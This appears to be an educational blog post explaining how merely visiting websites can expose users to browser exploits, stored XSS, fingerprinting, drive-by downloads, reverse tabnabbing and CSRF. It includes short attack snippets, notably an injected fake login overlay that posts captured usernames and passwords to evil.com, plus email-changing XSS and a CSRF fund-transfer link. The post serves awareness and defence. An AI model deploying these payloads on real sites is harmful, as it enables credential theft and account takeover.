---
layout: post
title: "Can a website harm your computer?"
---
Can a website install malware on your computer? Can it steal your data, if so from *where exactly*? Surely, you would be fine if you don’t click anything and use an ad blocker?  

It's hard to find a comprehensive source that answers all of these basic questions from the perspective of an end-user. And, to be fair, the security landscape is always changing, and so will the answers to these. To begin, I will narrow the scope and define what it means to _visit a website_: manually navigating to a website by its domain using any sort of web browser and viewing the served webpage will be the definition of *visiting a website*. There are other browserless notions of "visiting websites", for example, using a script to fetch HTTP content, but these will be disregarded to keep the post simple. In addition, there are a plethora of highly sophisticated, critical-severity security vulnerabilities, like network worms, or something like [CVE-2023-23397](https://nvd.nist.gov/vuln/detail/cve-2023-23397) that can steal your data or execute malware even if you don't visit a website at all! This post will only cover risks presented from a typical human website-visiting flow.

The common sense advice of using an ad blocker, not clicking download links, and not entering sensitive information into a page, are protective, but do not shield you from all of the danger. Below are just some of the things you expose yourself to even if you are 100% careful:

## Browser exploits  
Modern websites are built on JavaScript. Browsers, like Chrome, Firefox, Safari, and Edge, are designed to receive these JavaScript files and run them automatically as soon as a page loads. Under normal circumstances, this JavaScript is heavily sandboxed by the browser: it cannot read your computer's files, install programs, or directly access your operating system.

However, the browser itself is an extremely complex piece of software with many moving parts; millions of lines of code written in C/C++. Chromium alone has roughly two thousand dedicated engineers. Vulnerabilities in this code occasionally appear in the components responsible for executing JavaScript, rendering images, parsing fonts, processing audio/video, or interacting with the GPU. 

If an attacker discovers a new flaw in one of these components, they can craft malicious JavaScript that triggers the vulnerability the moment your browser loads the page, even if you do nothing at all. If the exploit succeeds, they could:
- execute arbitrary code on your device
- escape the browser’s security sandbox
- download and install malware
- read or modify your local files
- gain persistence on your system

Historically, the most common pathway in general involved using an exploit kit like [Angler](https://unit42.paloaltonetworks.com/unit42-understanding-angler-exploit-kit-part-1-exploit-kit-fundamentals/). A user visits a malicious website, which hosts this kit. The malicious server tries to profile the user's system via fingerprinting, gathering information about things like:
- Browser type/version
- OS type/version
- Installed plugins

The exploit kit then performs a search for an existing vulnerability in any of these components. Modern browsers and OSes update frequently and keep an eye out for these vulnerabilities, so exploits are rare and the chain typically ends here, and full-system compromise is extremely rare. However, if a valid vulnerability is found, the exploit gets delivered, its malware gets downloaded onto the victim's computer, and it may break out of the sandbox and execute it without any input. Again, this is often fragmented and in reality requires a chain of vulnerabilities to work.

There's nothing you can do to counteract this type of attack, except to keep your browser and its plugins up-to-date. Be cautious and keep up with security news when using alternate browsers: these are usually built off forks of popular browsers, and there is a chance they may lag behind security updates or have a less active development team to respond to discovered vulnerabilities. Avoid obsolete, abandoned browser projects.

## Web application exploits  
Web application vulnerabilities form an extremely large, evolving category that could not possibly be summarized in this post. I’ll highlight one example to give a sense of the kinds of risks of doing absolutely nothing wrong.

### Cross-Site Scripting (XSS)
This occurs when a website fails to properly sanitize user-provided input before displaying it to other users. I'll present one instance of this vulnerability that is most applicable to the idea of the post, called *stored XSS*. First, an attacker injects malicious JavaScript into a page: usually comment fields, search boxes, profile pages, or any other form that stores or reflects data. When another user loads that page, the attacker’s script runs _in the user's browser.

This malicious script can do anything the legitimate website’s JavaScript can do, such as:
- Steal data, and send it to a server controlled by the attacker
- Log keystrokes
- Modify the page to trick the user (e.g., fake login forms)
- Perform actions on the user’s behalf
- Redirect the user to malicious sites

For example, imagine your email is `user@example.com` and that is the email you've registered on a forum which allows users to post comments. You go to this forum while logged in and are browsing. Due to some engineering oversights, it does not filter out JavaScript. An attacker, whose email is `attacker@evil.com`, posts a comment containing: 

```
<script>
function maliciousAction() {
  fetch("/api/change-email", {
    method: "POST",
    credentials: "include",
    body: JSON.stringify({ email: "attacker@evil.com" })
  });
}
</script>
```

When you view that comment, your browser executes the script, changing your email to the attacker's.

## Privacy risks
This is the most realistic threat. By visiting a website, you are agreeing to share at least your IP address, rough location, OS, browser, device, device language, and timezone to the website owner, if you have not gone out of the way beforehand to conceal these (for example, using a VPN or request header modifiers). And, this is just the beginning. Using only information normally visible to all websites, you can be *uniquely* profiled, as it becomes increasingly uncommon to have certain combinations of the above. There are stateless tricks that can be used to profile users, such as exploiting the HTML `<canvas>` element. [The Tor Project believes this is the largest fingerprinting threat faced by browsers](https://2019.www.torproject.org/projects/torbrowser/design/#fingerprinting-linkability). [See my post about this](https://auglu.github.io/2025/12/28/canvas-fingerprinting.html).

Websites often load third-party scripts for purposes of ads or analytics which are executed by your browser. These scripts:
- can read anything on the page
- track your interactions, like clicks, scrolls, mouse movements, and keystrokes
- set cookies

While some websites may not necessarily be collecting this information for nefarious reasons (for instance, fingerprinting techniques are useful for websites to block spammy users or bots), it is worth being aware that, without active intervention, your online activity is not anonymous.

---

Keep in mind that so far these are risks that a user is vulnerable to even if they do not interact with anything on webpages. I've seen the zero-click app-level vulnerabilities on several popular websites.

In *practice* though, people do not act perfectly, which opens the door to this next category of risks which require at least one mistake on the user's end:

## Malware downloads
There are multiple things to consider here. First, the majority of malware is delivered by tricking users to download files, and having them open them or run them (if they are executable). Thus, one would think that downloading a suspicious file but not clicking it or running it is fine, but this is not actually true, which we will get to later. 

Second, HTML and JavaScript, in theory, do have the functionality to automatically download files with zero user input. So, in theory, malware could be downloaded onto a user's computer even just from visiting a website, which you may know as a *drive-by download*. Today, this is largely blocked by modern browsers' security settings, but as explained under **Browser exploits**, occasionally something may slip through the cracks. 

What happens to malware that's downloaded onto your computer, but just sits there without you clicking it and running it? Other software that's already on your device, or historically, even the OS itself, can potentially interact with the file without your input. Here's an example.

### The Windows Metafile vulnerability
Discovered in 2005 and resolved in 2006, this vulnerability was located in some versions of the Windows operating system. Windows File Explorer contained a bug in code that automatically processes files to generate thumbnails/previews of them. To make a thumbnail, Explorer must _interpret_ the file format by parsing the file. In this particular exploit, it was discovered that a type of file called a Windows Metafile (WMF) had an inherent, intentional defect where it could allow actual code to be executed whenever the file opens. This was mainly to handle the cancellation of print jobs during spooling. However, in this case, a maliciously crafted `.wmf` image that someone downloaded from a website could execute code just by being displayed/previewed (in the File Explorer preview, etc.), with no interaction required.

## Phishing
You have likely heard of classic phishing techniques: you get tricked into clicking a fake website in an email and then you enter your password, or you mistype a URL and someone has set up a typosquatted domain.

However, phishing is always evolving, and techniques can be subtle. It's important to remember that nobody is immune to phishing. Let's look at one example which exploits a trusted website's missing `Cross-Origin-Opener-Policy` headers  or `rel=noopener` protections.

### Reverse tabnabbing
Imagine a trusted website, `trusted-website.com` produces links to external websites. The HTML tag for opening a link in the same tab is:

`<a href="https://attacker.com">Go to site</a>`

To open a link in a new tab, one can add `target="_blank"`:

`<a href="https://attacker.com" target="_blank">Open in new tab</a>`

Or alternately, in JavaScript, `window.open("https://attacker.com")`

When an external website is opened in a new tab in this manner, the new webpage maintains a reference through the browser's JavaScript through a property called `window.opener` (the "opener" of the current page). In this situation, if this external webpage was malicious, it could have something like

`window.opener.location = https://attacker-version-of-trusted-website.com`

which silently swaps the original tab of `trusted-website.com` to `attacker-version-of-trusted-website.com`, which, for instance, could appear exactly identical to the original or have a very similar URL. If you didn't catch this, you could accidentally enter credentials into the attacker's swapped out website. 

### Cross-Site Request Forgery (CSRF)
This is caused by security misconfigurations, sometimes with something called the Cross-Origin Resource Sharing policy, or incorrect API design by trusted websites themselves. 

Imagine you are logged into a site. If you visit an alternate, malicious site on a different tab in the same browser, actions on that malicious site may cause your browser to send HTTP requests to the original site, with your cookies, and pretend to be you. Now, modern browsers attempt to stop zero-click versions of this attack by attaching `SameSite=Lax` cookies automatically; this stops some cookies from being sent across different websites. But, this does not stop cookies from being sent in every scenario, which is where poor design from a victim website comes into play.

First, let's say you log onto `normal-bank-website` to check your bank account. On the same browser you go to `evil-website.com`, a malicious site that a hacker owns and was designed to target `normal-bank-website` users. `evil-website` issues this request through this link:

`<a href="https://bank.com/transfer?amount=1000&to=eviluser">`

If `normal-bank-website` was poorly programmed to handle GET requests with side effects, the request could go through with your cookies attached and transfer funds from your account to theirs. The `SameSite=Lax` guardrail does not protect against this.

### Cross-Site Scripting (again)
XSS is actually more relevant here, because phishing is the most common use of XSS. As explained in **Web vulnerabilities**, attackers can arbitrarily inject code of their choosing on vulnerable websites, including code that creates fake phishing UIs:

```
// fake login UI
const overlay = document.createElement("div");
overlay.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;
              background:white;z-index:9999;">
    <h2>Your session has expired. Please log in again.</h2>
    <input id="u">
    <input id="p" type="password">
    <button onclick="steal()">Login</button>
  </div>
`;

document.body.appendChild(overlay);

function steal() {
  fetch("https://evil.com/creds", {
    method: "POST",
    body: JSON.stringify({
      user: document.getElementById("u").value,
      pass: document.getElementById("p").value
    })
  });
}
```

---

In practice, true zero-click full device "hacks" from websites are very rare and typically require multiple chained vulnerabilities. However, the web is still an untrusted environment, and insecure websites still leave the door open for data compromise and unintended effects. And, perhaps most importantly, users do not make perfect judgements. The takeaway from this is not that browsing the web is inherently unsafe, but that security depends on several layers, from browser and OS guardrails, website design quality, and user awareness together.
